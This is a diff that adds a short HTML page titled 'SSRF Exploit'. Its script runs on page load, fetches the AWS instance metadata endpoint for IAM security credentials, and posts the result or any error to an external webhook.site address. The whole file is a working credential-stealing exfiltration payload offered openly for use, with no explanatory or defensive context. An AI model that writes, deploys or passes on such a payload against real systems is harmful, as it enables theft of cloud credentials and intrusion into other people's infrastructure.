@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>SSRF Exploit</title>
+    <script>
+        (async function() {
+            try {
+                // Fetch AWS metadata
+                const response = await fetch('http://169.254.169.254/latest/meta-data/iam/security-credentials/');
+                const data = await response.text();
+
+                // Send the fetched data to your webhook
+                await fetch('https://webhook.site/9faca373-e052-47e8-b1e2-4356a2db2f2e', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ response: data })
+                });
+            } catch (error) {
+                // Send error details to your webhook
+                await fetch('https://webhook.site/9faca373-e052-47e8-b1e2-4356a2db2f2e', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ error: error.message })
+                });
+            }
+        })();
+    </script>
+</head>
+<body>
+    <p>Fetching AWS metadata...</p>
+</body>
+</html>
